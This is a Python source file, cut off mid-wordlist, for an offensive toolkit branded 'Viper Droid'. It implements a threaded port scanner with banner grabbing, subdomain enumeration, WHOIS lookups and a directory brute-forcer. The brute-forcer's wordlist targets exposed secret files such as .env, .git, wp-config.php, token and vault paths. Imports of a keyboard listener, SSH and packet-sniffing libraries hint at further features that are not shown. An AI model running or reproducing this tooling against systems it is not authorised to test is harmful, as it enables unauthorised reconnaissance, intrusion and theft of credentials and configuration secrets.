import socket
import requests
import concurrent.futures
import os
import hashlib
import subprocess
import ssl
import datetime
from scapy.all import ARP, Ether, srp, sniff, IP, TCP
import dns.resolver
import paramiko
import re
from cryptography.fernet import Fernet
import random
import time
import json
import openai  # For AI-powered features
from colorama import Fore, Style, init  # For colored output
import string
import webbrowser
import os
from urllib.parse import urlparse
import platform
from pynput import keyboard




# Initialize colorama
init(autoreset=True)

# Banner
BANNER = f"""
{Fore.GREEN}  ██╗   ██╗██╗██████╗ ███████╗███████╗██████╗ 
{Fore.GREEN}  ██║   ██║██║██╔══██╗██╔════╝██╔════╝██╔══██╗
{Fore.GREEN}  ██║   ██║██║██████╔╝█████╗  █████╗  ██████╔╝
{Fore.GREEN}  ██║   ██║██║██╔═══╝ ██╔══╝  ██╔══╝  ██╔══██╗
{Fore.GREEN}  ╚██████╔╝██║██║     ███████╗███████╗██║  ██║
{Fore.GREEN}   ╚═════╝ ╚═╝╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝
{Fore.RED}  Powered by Viper Droid
"""



#==========================================================================================================================================


# Function to grab banner from an open port
def grab_banner(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((target, port))
        sock.send(b"GET / HTTP/1.1\r\n\r\n")
        banner = sock.recv(1024).decode().strip()
        sock.close()
        return banner
    except Exception:
        return None

# Function to detect service based on port
def detect_service(port):
    try:
        service = socket.getservbyport(port)
        return service
    except:
        return "Unknown"

# Function to scan a single port
def scan_port(target, port, timeout, verbose):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((target, port))
        if result == 0:
            banner = grab_banner(target, port)
            service = detect_service(port)
            if banner:
                print(f"{Fore.GREEN}Port {port} is open | Service: {service} | Banner: {banner}{Style.RESET_ALL}")
            else:
                print(f"{Fore.GREEN}Port {port} is open | Service: {service}{Style.RESET_ALL}")
        elif verbose:
            print(f"{Fore.YELLOW}Port {port} is closed{Style.RESET_ALL}")
        sock.close()
    except Exception as e:
        if verbose:
            print(f"{Fore.RED}Error scanning port {port}: {e}{Style.RESET_ALL}")

# Advanced Port Scanner
def port_scanner(target, start_port, end_port):
    print(f"\n{Fore.CYAN}Scanning {target} from port {start_port} to {end_port}...{Style.RESET_ALL}")
    
    
    timeout = 1  
    verbose = True  
    max_threads = 100  

   
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = [
            executor.submit(scan_port, target, port, timeout, verbose)
            for port in range(start_port, end_port + 1)
        ]
        for future in concurrent.futures.as_completed(futures):
            pass  # Results are printed inside scan_port


#=========================================================================================================================================

# Function for subdomain enumeration
def subdomain_enumeration(domain, timeout=5, max_workers=10):
    print(f"\n{Fore.CYAN}Enumerating subdomains for {domain}...{Style.RESET_ALL}")

    # List of common subdomain prefixes
    common_subdomains = [
        "www", "mail", "ftp", "webmail", "smtp", "pop", "ns1", "ns2", 
    "admin", "blog", "dev", "test", "api", "secure", "vpn", "m", 
    "mobile", "static", "cdn", "app", "beta", "staging", "shop", 
    "support", "portal", "wiki", "docs", "status", "demo", "old",
    "new", "oldwww", "web", "web2", "web3", "web4", "web5", "web6", 
    "web7", "web8", "web9", "web10", "mail2", "mail3", "mail4", 
    "mail5", "mail6", "mail7", "mail8", "mail9", "mail10", "ftp2", 
    "ftp3", "ftp4", "ftp5", "ftp6", "ftp7", "ftp8", "ftp9", "ftp10", 
    "ns3", "ns4", "ns5", "ns6", "ns7", "ns8", "ns9", "ns10", "mx", 
    "mx1", "mx2", "mx3", "mx4", "mx5", "mx6", "mx7", "mx8", "mx9", 
    "mx10", "cpanel", "whm", "webdisk", "webhost", "host", "hosting", 
    "server", "server1", "server2", "server3", "server4", "server5", 
    "server6", "server7", "server8", "server9", "server10", "db", 
    "db1", "db2", "db3", "db4", "db5", "db6", "db7", "db8", "db9", 
    "db10", "sql", "sql1", "sql2", "sql3", "sql4", "sql5", "sql6", 
    "sql7", "sql8", "sql9", "sql10", "backup", "backup1", "backup2", 
    "backup3", "backup4", "backup5", "backup6", "backup7", "backup8", 
    "backup9", "backup10", "cloud", "cloud1", "cloud2", "cloud3", 
    "cloud4", "cloud5", "cloud6", "cloud7", "cloud8", "cloud9", 
    "cloud10", "storage", "storage1", "storage2", "storage3", 
    "storage4", "storage5", "storage6", "storage7", "storage8", 
    "storage9", "storage10", "assets", "assets1", "assets2", 
    "assets3", "assets4", "assets5", "assets6", "assets7", "assets8", 
    "assets9", "assets10", "media", "media1", "media2", "media3", 
    "media4", "media5", "media6", "media7", "media8", "media9", 
    "media10", "images", "images1", "images2", "images3", "images4", 
    "images5", "images6", "images7", "images8", "images9", "images10", 
    "videos", "videos1", "videos2", "videos3", "videos4", "videos5", 
    "videos6", "videos7", "videos8", "videos9", "videos10", "download", 
    "download1", "download2", "download3", "download4", "download5", 
    "download6", "download7", "download8", "download9", "download10", 
    "upload", "upload1", "upload2", "upload3", "upload4", "upload5", 
    "upload6", "upload7", "upload8", "upload9", "upload10", "files", 
    "files1", "files2", "files3", "files4", "files5", "files6", 
    "files7", "files8", "files9", "files10", "share", "share1", 
    "share2", "share3", "share4", "share5", "share6", "share7", 
    "share8", "share9", "share10", "sync", "sync1", "sync2", "sync3", 
    "sync4", "sync5", "sync6", "sync7", "sync8", "sync9", "sync10", 
    "git", "git1", "git2", "git3", "git4", "git5", "git6", "git7", 
    "git8", "git9", "git10", "svn", "svn1", "svn2", "svn3", "svn4", 
    "svn5", "svn6", "svn7", "svn8", "svn9", "svn10", "jenkins", 
    "jenkins1", "jenkins2", "jenkins3", "jenkins4", "jenkins5", 
    "jenkins6", "jenkins7", "jenkins8", "jenkins9", "jenkins10", 
    "ci", "ci1", "ci2", "ci3", "ci4", "ci5", "ci6", "ci7", "ci8", 
    "ci9", "ci10", "test1", "test2", "test3", "test4", "test5", 
    "test6", "test7", "test8", "test9", "test10", "stage", "stage1", 
    "stage2", "stage3", "stage4", "stage5", "stage6", "stage7", 
    "stage8", "stage9", "stage10", "prod", "prod1", "prod2", "prod3", 
    "prod4", "prod5", "prod6", "prod7", "prod8", "prod9", "prod10", 
    "live", "live1", "live2", "live3", "live4", "live5", "live6", 
    "live7", "live8", "live9", "live10", "uat", "uat1", "uat2", 
    "uat3", "uat4", "uat5", "uat6", "uat7", "uat8", "uat9", "uat10", 
    "preprod", "preprod1", "preprod2", "preprod3", "preprod4", 
    "preprod5", "preprod6", "preprod7", "preprod8", "preprod9", 
    "preprod10", "sandbox", "sandbox1", "sandbox2", "sandbox3", 
    "sandbox4", "sandbox5", "sandbox6", "sandbox7", "sandbox8", 
    "sandbox9", "sandbox10", "playground", "playground1", "playground2", 
    "playground3", "playground4", "playground5", "playground6", 
    "playground7", "playground8", "playground9", "playground10", 
    "lab", "lab1", "lab2", "lab3", "lab4", "lab5", "lab6", "lab7", 
    "lab8", "lab9", "lab10", "research", "research1", "research2", 
    "research3", "research4", "research5", "research6", "research7", 
    "research8", "research9", "research10", "internal", "internal1", 
    "internal2", "internal3", "internal4", "internal5", "internal6", 
    "internal7", "internal8", "internal9", "internal10", "intranet", 
    "intranet1", "intranet2", "intranet3", "intranet4", "intranet5", 
    "intranet6", "intranet7", "intranet8", "intranet9", "intranet10", 
    "extranet", "extranet1", "extranet2", "extranet3", "extranet4", 
    "extranet5", "extranet6", "extranet7", "extranet8", "extranet9", 
    "extranet10", "partner", "partner1", "partner2", "partner3", 
    "partner4", "partner5", "partner6", "partner7", "partner8", 
    "partner9", "partner10", "client", "client1", "client2", "client3", 
    "client4", "client5", "client6", "client7", "client8", "client9", 
    "client10", "customer", "customer1", "customer2", "customer3", 
    "customer4", "customer5", "customer6", "customer7", "customer8", 
    "customer9", "customer10", "vendor", "vendor1", "vendor2", 
    "vendor3", "vendor4", "vendor5", "vendor6", "vendor7", "vendor8", 
    "vendor9", "vendor10", "supplier", "supplier1", "supplier2", 
    "supplier3", "supplier4", "supplier5", "supplier6", "supplier7", 
    "supplier8", "supplier9", "supplier10", "service", "service1", 
    "service2", "service3", "service4", "service5", "service6", 
    "service7", "service8", "service9", "service10", "tools", "tools1", 
    "tools2", "tools3", "tools4", "tools5", "tools6", "tools7", 
    "tools8", "tools9", "tools10", "help", "help1", "help2", "help3", 
    "help4", "help5", "help6", "help7", "help8", "help9", "help10", 
    "info", "info1", "info2", "info3", "info4", "info5", "info6", 
    "info7", "info8", "info9", "info10", "contact", "contact1", 
    "contact2", "contact3", "contact4", "contact5", "contact6", 
    "contact7", "contact8", "contact9", "contact10", "sales", "sales1", 
    "sales2", "sales3", "sales4", "sales5", "sales6", "sales7", 
    "sales8", "sales9", "sales10", "marketing", "marketing1", 
    "marketing2", "marketing3", "marketing4", "marketing5", 
    "marketing6", "marketing7", "marketing8", "marketing9", 
    "marketing10", "hr", "hr1", "hr2", "hr3", "hr4", "hr5", "hr6", 
    "hr7", "hr8", "hr9", "hr10", "finance", "finance1", "finance2", 
    "finance3", "finance4", "finance5", "finance6", "finance7", 
    "finance8", "finance9", "finance10", "legal", "legal1", "legal2", 
    "legal3", "legal4", "legal5", "legal6", "legal7", "legal8", 
    "legal9", "legal10", "it", "it1", "it2", "it3", "it4", "it5", 
    "it6", "it7", "it8", "it9", "it10", "ops", "ops1", "ops2", "ops3", 
    "ops4", "ops5", "ops6", "ops7", "ops8", "ops9", "ops10", "devops", 
    "devops1", "devops2", "devops3", "devops4", "devops5", "devops6", 
    "devops7", "devops8", "devops9", "devops10", "security", 
    "security1", "security2", "security3", "security4", "security5", 
    "security6", "security7", "security8", "security9", "security10", 
    "monitoring", "monitoring1", "monitoring2", "monitoring3", 
    "monitoring4", "monitoring5", "monitoring6", "monitoring7", 
    "monitoring8", "monitoring9", "monitoring10", "analytics", 
    "analytics1", "analytics2", "analytics3", "analytics4", 
    "analytics5", "analytics6", "analytics7", "analytics8", 
    "analytics9", "analytics10", "reporting", "reporting1", 
    "reporting2", "reporting3", "reporting4", "reporting5", 
    "reporting6", "reporting7", "reporting8", "reporting9", 
    "reporting10", "dashboard", "dashboard1", "dashboard2", 
    "dashboard3", "dashboard4", "dashboard5", "dashboard6", 
    "dashboard7", "dashboard8", "dashboard9", "dashboard10", 
    "console", "console1", "console2", "console3", "console4", 
    "console5", "console6", "console7", "console8", "console9", 
    "console10", "control", "control1", "control2", "control3", 
    "control4", "control5", "control6", "control7", "control8", 
    "control9", "control10", "manager", "manager1", "manager2", 
    "manager3", "manager4", "manager5", "manager6", "manager7", 
    "manager8", "manager9", "manager10", "admin1", "admin2", "admin3", 
    "admin4", "admin5", "admin6", "admin7", "admin8", "admin9", 
    "admin10", "root", "root1", "root2", "root3", "root4", "root5", 
    "root6", "root7", "root8", "root9", "root10", "superuser", 
    "superuser1", "superuser2", "superuser3", "superuser4", 
    "superuser5", "superuser6", "superuser7", "superuser8", 
    "superuser9", "superuser10", "sysadmin", "sysadmin1", "sysadmin2", 
    "sysadmin3", "sysadmin4", "sysadmin5", "sysadmin6", "sysadmin7", 
    "sysadmin8", "sysadmin9", "sysadmin10", "webmaster", "webmaster1", 
    "webmaster2", "webmaster3", "webmaster4", "webmaster5", 
    "webmaster6", "webmaster7", "webmaster8", "webmaster9", 
    "webmaster10", "hostmaster", "hostmaster1", "hostmaster2", 
    "hostmaster3", "hostmaster4", "hostmaster5", "hostmaster6", 
    "hostmaster7", "hostmaster8", "hostmaster9", "hostmaster10", 
    "postmaster", "postmaster1", "postmaster2", "postmaster3", 
    "postmaster4", "postmaster5", "postmaster6", "postmaster7", 
    "postmaster8", "postmaster9", "postmaster10", "abuse", "abuse1", 
    "abuse2", "abuse3", "abuse4", "abuse5", "abuse6", "abuse7", 
    "abuse8", "abuse9", "abuse10", "noc", "noc1", "noc2", "noc3", 
    "noc4", "noc5", "noc6", "noc7", "noc8", "noc9", "noc10", "support1", 
    "support2", "support3", "support4", "support5", "support6", 
    "support7", "support8", "support9", "support10", "helpdesk", 
    "helpdesk1", "helpdesk2", "helpdesk3", "helpdesk4", "helpdesk5", 
    "helpdesk6", "helpdesk7", "helpdesk8", "helpdesk9", "helpdesk10", 
    "ticket", "ticket1", "ticket2", "ticket3", "ticket4", "ticket5", 
    "ticket6", "ticket7", "ticket8", "ticket9", "ticket10", "issue", 
    "issue1", "issue2", "issue3", "issue4", "issue5", "issue6", 
    "issue7", "issue8", "issue9", "issue10", "bug", "bug1", "bug2", 
    "bug3", "bug4", "bug5", "bug6", "bug7", "bug8", "bug9", "bug10", 
    "feature", "feature1", "feature2", "feature3", "feature4", 
    "feature5", "feature6", "feature7", "feature8", "feature9", 
    "feature10", "request", "request1", "request2", "request3", 
    "request4", "request5", "request6", "request7", "request8", 
    "request9", "request10", "feedback", "feedback1", "feedback2", 
    "feedback3", "feedback4", "feedback5", "feedback6", "feedback7", 
    "feedback8", "feedback9", "feedback10", "survey", "survey1", 
    "survey2", "survey3", "survey4", "survey5", "survey6", "survey7", 
    "survey8", "survey9", "survey10", "poll", "poll1", "poll2", 
    "poll3", "poll4", "poll5", "poll6", "poll7", "poll8", "poll9", 
    "poll10", "vote", "vote1", "vote2", "vote3", "vote4", "vote5", 
    "vote6", "vote7", "vote8", "vote9", "vote10", "quiz", "quiz1", 
    "quiz2", "quiz3", "quiz4", "quiz5", "quiz6", "quiz7", "quiz8", 
    "quiz9", "quiz10", "game", "game1", "game2", "game3", "game4", 
    "game5", "game6", "game7", "game8", "game9", "game10", "play", 
    "play1", "play2", "play3", "play4", "play5", "play6", "play7", 
    "play8", "play9", "play10", "fun", "fun1", "fun2", "fun3", "fun4", 
    "fun5", "fun6", "fun7", "fun8", "fun9", "fun10", "chat", "chat1", 
    "chat2", "chat3", "chat4", "chat5", "chat6", "chat7", "chat8", 
    "chat9", "chat10", "forum", "forum1", "forum2", "forum3", 
    "forum4", "forum5", "forum6", "forum7", "forum8", "forum9", 
    "forum10", "community", "community1", "community2", "community3", 
    "community4", "community5", "community6", "community7", 
    "community8", "community9", "community10", "social", "social1", 
    "social2", "social3", "social4", "social5", "social6", "social7", 
    "social8", "social9", "social10", "network", "network1", 
    "network2", "network3", "network4", "network5", "network6", 
    "network7", "network8", "network9", "network10", "connect", 
    "connect1", "connect2", "connect3", "connect4", "connect5", 
    "connect6", "connect7", "connect8", "connect9", "connect10", 
    "meet", "meet1", "meet2", "meet3", "meet4", "meet5", "meet6", 
    "meet7", "meet8", "meet9", "meet10", "event", "event1", "event2", 
    "event3", "event4", "event5", "event6", "event7", "event8", 
    "event9", "event10", "calendar", "calendar1", "calendar2", 
    "calendar3", "calendar4", "calendar5", "calendar6", "calendar7", 
    "calendar8", "calendar9", "calendar10", "schedule", "schedule1", 
    "schedule2", "schedule3", "schedule4", "schedule5", "schedule6", 
    "schedule7", "schedule8", "schedule9", "schedule10", "time", 
    "time1", "time2", "time3", "time4", "time5", "time6", "time7", 
    "time8", "time9", "time10", "clock", "clock1", "clock2", "clock3", 
    "clock4", "clock5", "clock6", "clock7", "clock8", "clock9", 
    "clock10", "timer", "timer1", "timer2", "timer3", "timer4", 
    "timer5", "timer6", "timer7", "timer8", "timer9", "timer10", 
    "stopwatch", "stopwatch1", "stopwatch2", "stopwatch3", 
    "stopwatch4", "stopwatch5", "stopwatch6", "stopwatch7", 
    "stopwatch8", "stopwatch9", "stopwatch10", "countdown", 
    "countdown1", "countdown2", "countdown3", "countdown4", 
    "countdown5", "countdown6", "countdown7", "countdown8", 
    "countdown9", "countdown10", "alarm", "alarm1", "alarm2", 
    "alarm3", "alarm4", "alarm5", "alarm6", "alarm7", "alarm8", 
    "alarm9", "alarm10", "reminder", "reminder1", "reminder2", 
    "reminder3", "reminder4", "reminder5", "reminder6", "reminder7", 
    "reminder8", "reminder9", "reminder10", "notification", 
    "notification1", "notification2", "notification3", 
    "notification4", "notification5", "notification6", 
    "notification7", "notification8", "notification9", 
    "notification10", "alert", "alert1", "alert2", "alert3", 
    "alert4", "alert5", "alert6", "alert7", "alert8", "alert9", 
    "alert10", "warning", "warning1", "warning2", "warning3", 
    "warning4", "warning5", "warning6", "warning7", "warning8", 
    "warning9", "warning10", "error", "error1", "error2", "error3", 
    "error4", "error5", "error6", "error7", "error8", "error9", 
    "error10", "log", "log1", "log2", "log3", "log4", "log5", "log6", 
    "log7", "log8", "log9", "log10", "history", "history1", "history2", 
    "history3", "history4", "history5", "history6", "history7", 
    "history8", "history9", "history10", "archive", "archive1", 
    "archive2", "archive3", "archive4", "archive5", "archive6", 
    "archive7", "archive8", "archive9", "archive10", "backup", 
    "backup1", "backup2", "backup3", "backup4", "backup5", "backup6", 
    "backup7", "backup8", "backup9", "backup10", "restore", 
    "restore1", "restore2", "restore3", "restore4", "restore5", 
    "restore6", "restore7", "restore8", "restore9", "restore10", 
    "recovery", "recovery1", "recovery2", "recovery3", "recovery4", 
    "recovery5", "recovery6", "recovery7", "recovery8", "recovery9", 
    "recovery10", "snapshot", "snapshot1", "snapshot2", "snapshot3", 
    "snapshot4", "snapshot5", "snapshot6", "snapshot7", "snapshot8", 
    "snapshot9", "snapshot10", "image", "image1", "image2", "image3", 
    "image4", "image5", "image6", "image7", "image8", "image9", 
    "image10", "photo", "photo1", "photo2", "photo3", "photo4", 
    "photo5", "photo6", "photo7", "photo8", "photo9", "photo10", 
    "picture", "picture1", "picture2", "picture3", "picture4", 
    "picture5", "picture6", "picture7", "picture8", "picture9", 
    "picture10", "gallery", "gallery1", "gallery2", "gallery3", 
    "gallery4", "gallery5", "gallery6", "gallery7", "gallery8", 
    "gallery9", "gallery10", "album", "album1", "album2", "album3", 
    "album4", "album5", "album6", "album7", "album8", "album9", 
    "album10", "video", "video1", "video2", "video3", "video4", 
    "video5", "video6", "video7", "video8", "video9", "video10", 
    "movie", "movie1", "movie2", "movie3", "movie4", "movie5", 
    "movie6", "movie7", "movie8", "movie9", "movie10", "music", 
    "music1", "music2", "music3", "music4", "music5", "music6", 
    "music7", "music8", "music9", "music10", "audio", "audio1", 
    "audio2", "audio3", "audio4", "audio5", "audio6", "audio7", 
    "audio8", "audio9", "audio10", "sound", "sound1", "sound2", 
    "sound3", "sound4", "sound5", "sound6", "sound7", "sound8", 
    "sound9", "sound10", "podcast", "podcast1", "podcast2", 
    "podcast3", "podcast4", "podcast5", "podcast6", "podcast7", 
    "podcast8", "podcast9", "podcast10", "stream", "stream1", 
    "stream2", "stream3", "stream4", "stream5", "stream6", 
    "stream7", "stream8", "stream9", "stream10", "live", "live1", 
    "live2", "live3", "live4", "live5", "live6", "live7", "live8", 
    "live9", "live10", "broadcast", "broadcast1", "broadcast2", 
    "broadcast3", "broadcast4", "broadcast5", "broadcast6", 
    "broadcast7", "broadcast8", "broadcast9", "broadcast10", 
    "tv", "tv1", "tv2", "tv3", "tv4", "tv5", "tv6", "tv7", "tv8", 
    "tv9", "tv10", "radio",
    ]

    found_subdomains = []

    def check_subdomain(subdomain):
        full_domain = f"{subdomain}.{domain}"
        try:
            # First, check if the subdomain resolves to an IP address
            socket.gethostbyname(full_domain)
            
            # If it resolves, make an HTTP request
            url = f"http://{full_domain}"
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
            response = requests.get(url, headers=headers, timeout=timeout)
            if response.status_code == 200:
                print(f"{Fore.GREEN}[+] Found: {url}{Style.RESET_ALL}")
                found_subdomains.append(url)
        except (socket.gaierror, requests.exceptions.RequestException):
            pass

   
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(check_subdomain, subdomain) for subdomain in common_subdomains]
        
       
        for i, future in enumerate(concurrent.futures.as_completed(futures)):
            print(f"{Fore.YELLOW}Progress: {i+1}/{len(common_subdomains)}{Style.RESET_ALL}", end="\r")

    print(f"\n{Fore.CYAN}Subdomain enumeration completed. Found {len(found_subdomains)} subdomains.{Style.RESET_ALL}")


#=======================================================================================================================================

# Function for WHOIS lookup
whois_cache = {}

def whois_lookup(domain, timeout=10):
    print(f"\n{Fore.CYAN}Performing WHOIS lookup for {domain}...{Style.RESET_ALL}")

    # Validate domain format
    if not re.match(r"^([a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,}$", domain, re.IGNORECASE):
        print(f"{Fore.RED}Error: Invalid domain format.{Style.RESET_ALL}")
        return

    # Check cache first
    if domain in whois_cache:
        print(f"{Fore.YELLOW}Cached WHOIS data for {domain}:{Style.RESET_ALL}")
        print(whois_cache[domain])
        return

    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
        }
        response = requests.get(f"https://api.whois.vu/?q={domain}", headers=headers, timeout=timeout)
        response.raise_for_status()  # Raise an exception for HTTP errors

        # Parse and format the WHOIS response
        whois_data = response.text
        formatted_data = format_whois_data(whois_data)

        # Cache the result
        whois_cache[domain] = formatted_data

        print(f"{Fore.GREEN}WHOIS data for {domain}:{Style.RESET_ALL}")
        print(formatted_data)

    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Error: Failed to retrieve WHOIS data. {e}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}Unexpected error: {e}{Style.RESET_ALL}")

def format_whois_data(whois_data):
    """
    Formats raw WHOIS data into a more readable structure.
    """
    formatted_data = []
    for line in whois_data.splitlines():
        if ":" in line:
            key, value = line.split(":", 1)
            formatted_data.append(f"{Fore.YELLOW}{key.strip():<20}{Style.RESET_ALL}{value.strip()}")
        else:
            formatted_data.append(line.strip())
    return "\n".join(formatted_data)
#==================================================================================================================

# Function for directory brute-forcing
def directory_bruteforce(url, timeout=5, max_workers=10):
    print(f"\n{Fore.CYAN}Brute-forcing directories on {url}...{Style.RESET_ALL}")

    # Dynamic wordlist of common directories and file names
    common_directories = [
         "admin", "login", "wp-admin", "wp-login", "dashboard", "controlpanel", 
    "api", "test", "dev", "backup", "config", "storage", "assets", "images", 
    "css", "js", "uploads", "downloads", "files", "documents", "logs", 
    "tmp", "temp", "cgi-bin", "bin", "scripts", "phpmyadmin", "server-status", 
    "robots.txt", ".htaccess", ".git", ".svn", ".env", "config.php", "wp-config.php",
    "adminer", "administrator", "manager", "webadmin", "sysadmin", "root", 
    "private", "secret", "hidden", "secure", "internal", "intranet", "external", 
    "public", "web", "web2", "web3", "web4", "web5", "web6", "web7", "web8", 
    "web9", "web10", "old", "new", "beta", "staging", "production", "live", 
    "demo", "test1", "test2", "test3", "test4", "test5", "test6", "test7", 
    "test8", "test9", "test10", "dev1", "dev2", "dev3", "dev4", "dev5", "dev6", 
    "dev7", "dev8", "dev9", "dev10", "backup1", "backup2", "backup3", "backup4", 
    "backup5", "backup6", "backup7", "backup8", "backup9", "backup10", "archive", 
    "archive1", "archive2", "archive3", "archive4", "archive5", "archive6", 
    "archive7", "archive8", "archive9", "archive10", "data", "database", "db", 
    "db1", "db2", "db3", "db4", "db5", "db6", "db7", "db8", "db9", "db10", 
    "sql", "sql1", "sql2", "sql3", "sql4", "sql5", "sql6", "sql7", "sql8", 
    "sql9", "sql10", "mysql", "mysql1", "mysql2", "mysql3", "mysql4", "mysql5", 
    "mysql6", "mysql7", "mysql8", "mysql9", "mysql10", "mongo", "mongo1", 
    "mongo2", "mongo3", "mongo4", "mongo5", "mongo6", "mongo7", "mongo8", 
    "mongo9", "mongo10", "redis", "redis1", "redis2", "redis3", "redis4", 
    "redis5", "redis6", "redis7", "redis8", "redis9", "redis10", "cache", 
    "cache1", "cache2", "cache3", "cache4", "cache5", "cache6", "cache7", 
    "cache8", "cache9", "cache10", "session", "session1", "session2", "session3", 
    "session4", "session5", "session6", "session7", "session8", "session9", 
    "session10", "auth", "auth1", "auth2", "auth3", "auth4", "auth5", "auth6", 
    "auth7", "auth8", "auth9", "auth10", "oauth", "oauth1", "oauth2", "oauth3", 
    "oauth4", "oauth5", "oauth6", "oauth7", "oauth8", "oauth9", "oauth10", 
    "token", "token1", "token2", "token3", "token4", "token5", "token6", 
    "token7", "token8", "token9", "token10", "key", "key1", "key2", "key3", 
    "key4", "key5", "key6", "key7", "key8", "key9", "key10", "cert", "cert1", 
    "cert2", "cert3", "cert4", "cert5", "cert6", "cert7", "cert8", "cert9", 
    "cert10", "ssl", "ssl1", "ssl2", "ssl3", "ssl4", "ssl5", "ssl6", "ssl7", 
    "ssl8", "ssl9", "ssl10", "vpn", "vpn1", "vpn2", "vpn3", "vpn4", "vpn5", 
    "vpn6", "vpn7", "vpn8", "vpn9", "vpn10", "ftp", "ftp1", "ftp2", "ftp3", 
    "ftp4", "ftp5", "ftp6", "ftp7", "ftp8", "ftp9", "ftp10", "sftp", "sftp1", 
    "sftp2", "sftp3", "sftp4", "sftp5", "sftp6", "sftp7", "sftp8", "sftp9", 
    "sftp10", "ssh", "ssh1", "ssh2", "ssh3", "ssh4", "ssh5", "ssh6", "ssh7", 
    "ssh8", "ssh9", "ssh10", "shell", "shell1", "shell2", "shell3", "shell4", 
    "shell5", "shell6", "shell7", "shell8", "shell9", "shell10", "console", 
    "console1", "console2", "console3", "console4", "console5", "console6", 
    "console7", "console8", "console9", "console10", "command", "command1", 
    "command2", "command3", "command4", "command5", "command6", "command7", 
    "command8", "command9", "command10", "terminal", "terminal1", "terminal2", 
    "terminal3", "terminal4", "terminal5", "terminal6", "terminal7", "terminal8", 
    "terminal9", "terminal10", "cli", "cli1", "cli2", "cli3", "cli4", "cli5", 
    "cli6", "cli7", "cli8", "cli9", "cli10", "cron", "cron1", "cron2", "cron3", 
    "cron4", "cron5", "cron6", "cron7", "cron8", "cron9", "cron10", "job", 
    "job1", "job2", "job3", "job4", "job5", "job6", "job7", "job8", "job9", 
    "job10", "task", "task1", "task2", "task3", "task4", "task5", "task6", 
    "task7", "task8", "task9", "task10", "queue", "queue1", "queue2", "queue3", 
    "queue4", "queue5", "queue6", "queue7", "queue8", "queue9", "queue10", 
    "worker", "worker1", "worker2", "worker3", "worker4", "worker5", "worker6", 
    "worker7", "worker8", "worker9", "worker10", "service", "service1", 
    "service2", "service3", "service4", "service5", "service6", "service7", 
    "service8", "service9", "service10", "api1", "api2", "api3", "api4", "api5", 
    "api6", "api7", "api8", "api9", "api10", "rest", "rest1", "rest2", "rest3", 
    "rest4", "rest5", "rest6", "rest7", "rest8", "rest9", "rest10", "graphql", 
    "graphql1", "graphql2", "graphql3", "graphql4", "graphql5", "graphql6", 
    "graphql7", "graphql8", "graphql9", "graphql10", "soap", "soap1", "soap2", 
    "soap3", "soap4", "soap5", "soap6", "soap7", "soap8", "soap9", "soap10", 
    "xml", "xml1", "xml2", "xml3", "xml4", "xml5", "xml6", "xml7", "xml8", 
    "xml9", "xml10", "json", "json1", "json2", "json3", "json4", "json5", 
    "json6", "json7", "json8", "json9", "json10", "yaml", "yaml1", "yaml2", 
    "yaml3", "yaml4", "yaml5", "yaml6", "yaml7", "yaml8", "yaml9", "yaml10", 
    "ini", "ini1", "ini2", "ini3", "ini4", "ini5", "ini6", "ini7", "ini8", 
    "ini9", "ini10", "conf", "conf1", "conf2", "conf3", "conf4", "conf5", 
    "conf6", "conf7", "conf8", "conf9", "conf10", "settings", "settings1", 
    "settings2", "settings3", "settings4", "settings5", "settings6", "settings7", 
    "settings8", "settings9", "settings10", "config1", "config2", "config3", 
    "config4", "config5", "config6", "config7", "config8", "config9", "config10", 
    "env1", "env2", "env3", "env4", "env5", "env6", "env7", "env8", "env9", 
    "env10", "secrets", "secrets1", "secrets2", "secrets3", "secrets4", 
    "secrets5", "secrets6", "secrets7", "secrets8", "secrets9", "secrets10", 
    "keys", "keys1", "keys2", "keys3", "keys4", "keys5", "keys6", "keys7", 
    "keys8", "keys9", "keys10", "certs", "certs1", "certs2", "certs3", "certs4", 
    "certs5", "certs6", "certs7", "certs8", "certs9", "certs10", "ssl-certs", 
    "ssl-certs1", "ssl-certs2", "ssl-certs3", "ssl-certs4", "ssl-certs5", 
    "ssl-certs6", "ssl-certs7", "ssl-certs8", "ssl-certs9", "ssl-certs10", 
    "vault", "vault1", "vault2", "vault3", "vault4", "vault5", "vault6", 
    "vault7", "vault8", "vault9", "vault10", "secure", "secure1", "secure2", 
    "secure3", "secure4", "secure5", "secure6", "secure7", "secure8", "secure9", 
    "secure10", "auth-tokens", "auth-tokens1", "auth-tokens2", "auth-tokens3", 
    "auth-tokens4", "auth-tokens5", "auth-tokens6", "auth-tokens7", "auth-tokens8", 
    "auth-tokens9", "auth-tokens10", "oauth-tokens", "oauth-tokens1", "oauth-tokens2", 
    "oauth-tokens3", "oauth-tokens4", "oauth-tokens5", "oauth-tokens6", "oauth-tokens7", 
    "oauth-tokens8", "oauth-tokens9", "oauth-tokens10", "jwt", "jwt1", "jwt2", 
    "jwt3", "jwt4", "jwt5", "jwt6", "jwt7", "jwt8", "jwt9", "jwt10", "tokens", 
    "tokens1", "tokens2", "tokens3", "tokens4", "tokens5", "tokens6", "tokens7", 
    "tokens8", "tokens9", "tokens10", "sessions", "sessions1", "sessions2", 
    "sessions3", "sessions4", "sessions5", "sessions6", "sessions7", "sessions8", 
    "sessions9", "sessions10", "cookies", "cookies1", "cookies2", "cookies3", 
    "cookies4", "cookies5", "cookies6", "cookies7", "cookies8", "cookies9", 
    "cookies10", "headers", "headers1", "headers2", "headers3", "headers4", 
    "headers5", "headers6", "headers7", "headers8", "headers9", "headers10", 
    "params", "params1", "params2", "params3", "params4", "params5", "params6", 
    "params7", "params8", "params9", "params10", "query", "query1", "query2", 
    "query3", "query4", "query5", "query6", "query7", "query8", "query9", "query10", 
    "endpoint", "endpoint1", "endpoint2", "endpoint3", "endpoint4", "endpoint5", 
